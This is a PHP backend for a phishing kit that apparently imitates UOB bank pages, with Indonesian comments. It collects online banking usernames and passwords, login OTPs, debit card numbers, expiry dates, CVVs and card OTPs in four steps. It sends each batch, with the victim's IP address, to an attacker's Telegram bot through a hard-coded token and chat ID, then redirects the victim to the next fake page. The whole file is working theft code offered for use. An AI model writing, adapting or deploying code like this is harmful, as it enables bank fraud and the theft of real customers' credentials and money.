<?php
session_start();

// Konfigurasi Bot Telegram
$botToken = "8966756119:AAFJkGhQ2tfvqkWhgKjt8JzVym1DZTo4mZc"; 
$chatId = "7772104266"; 

function sendMessage($token, $chat, $text) {
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage";
    $data = [
        'chat_id' => $chat,
        'text' => $text,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

function getIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$ip = getIP();
date_default_timezone_set('Asia/Jakarta');
$waktu = date('d-m-Y H:i:s');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $message = "";
    $redirect = "index.php";

    // 1. Logika Login (login.html)
    if (isset($_POST['user']) && isset($_POST['pass'])) {
        $user = $_POST['user'];
        $pass = $_POST['pass'];
        $_SESSION['user'] = $user;
        $_SESSION['pass'] = $pass;
        
        $message = "
━─━────༺𝗨𝗢𝗕༻────━─━
𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 :
<code>$user</code>
𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱 :
<code>$pass</code>
𝗜𝗣 𝗔𝗱𝗱𝗿𝗲𝘀𝘀 :
<code>$ip</code>
━─━────༺𝗨𝗢𝗕༻────━─━";
        
        $redirect = "otp_login.html";
    } 
    // 2. Logika OTP Login (otp_login.html)
    elseif (isset($_POST['otp_code']) && !isset($_POST['penyedia'])) {
        $otp = $_POST['otp_code'];
        $user = isset($_SESSION['user']) ? $_SESSION['user'] : "-";
        $pass = isset($_SESSION['pass']) ? $_SESSION['pass'] : "-";
        
        $message = "
━─━────༺𝗨𝗢𝗕༻────━─━
𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 :
<code>$user</code>
𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱 :
<code>$pass</code>
𝗢𝗧𝗣 𝗖𝗼𝗱𝗲 :
<code>$otp</code>
𝗜𝗣 𝗔𝗱𝗱𝗿𝗲𝘀𝘀 :
<code>$ip</code>
━─━────༺𝗨𝗢𝗕༻────━─━";
        
        $redirect = "index.php";
    }
    // 3. Logika Data Kartu (card2.html & banklain.html)
    elseif (isset($_POST['nomorkartu'])) {
        $bank = isset($_POST['penyedia']) ? $_POST['penyedia'] : "UOB";
        $nomorkartu = $_POST['nomorkartu'];
        $valid = isset($_POST['valid']) ? $_POST['valid'] : "-";
        $cvv = isset($_POST['cvv']) ? $_POST['cvv'] : "-";
        
        $_SESSION['bank'] = $bank;
        $_SESSION['nomorkartu'] = $nomorkartu;
        $_SESSION['valid'] = $valid;
        $_SESSION['cvv'] = $cvv;
        
        $message = "
━─━────༺𝗨𝗢𝗕༻────━─━
𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂 𝗗𝗲𝗯𝗶𝘁/𝗔𝗧𝗠 :
<code>$nomorkartu</code>
𝗠𝗮𝘀𝗮 𝗕𝗲𝗿𝗹𝗮𝗸𝘂 :
<code>$valid</code>
𝗖𝗩𝗩/𝗡𝗼 𝗛𝗣 :
<code>$cvv</code>
𝗜𝗣 𝗔𝗱𝗱𝗿𝗲𝘀𝘀 :
<code>$ip</code>
━─━────༺𝗨𝗢𝗕༻────━─━";
        
        $redirect = "otp.html";
    }
    // 4. Logika OTP Kartu (otp.html)
    elseif (isset($_POST['otp_bank'])) {
        $otp = $_POST['otp_bank'];
        $bank = isset($_SESSION['bank']) ? $_SESSION['bank'] : "-";
        $nomorkartu = isset($_SESSION['nomorkartu']) ? $_SESSION['nomorkartu'] : "-";
        $valid = isset($_SESSION['valid']) ? $_SESSION['valid'] : "-";
        $cvv = isset($_SESSION['cvv']) ? $_SESSION['cvv'] : "-";
        
        $message = "
━─━────༺𝗨𝗢𝗕༻────━─━
𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂 𝗗𝗲𝗯𝗶𝘁/𝗔𝗧𝗠 :
<code>$nomorkartu</code>
𝗠𝗮𝘀𝗮 𝗕𝗲𝗿𝗹𝗮𝗸𝘂 :
<code>$valid</code>
𝗖𝗩𝗩/𝗡𝗼 𝗛𝗣 :
<code>$cvv</code>
𝗢𝗧𝗣 𝗖𝗼𝗱𝗲 :
<code>$otp</code>
𝗜𝗣 𝗔𝗱𝗱𝗿𝗲𝘀𝘀 :
<code>$ip</code>
━─━────༺𝗨𝗢𝗕༻────━─━";
        
        $redirect = "index.php";
    }

    if ($message != "") {
        sendMessage($botToken, $chatId, $message);
    }

    header("Location: $redirect");
    exit();
}
?>
